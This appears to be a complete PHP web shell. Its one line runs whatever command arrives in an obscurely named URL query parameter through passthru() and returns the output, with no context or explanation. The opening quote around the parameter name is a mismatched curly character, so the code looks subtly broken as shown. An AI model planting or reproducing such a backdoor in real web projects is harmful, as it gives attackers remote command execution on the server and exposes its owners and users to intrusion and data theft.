<?php
passthru($_GET[’gz9OVgbc']);
?>
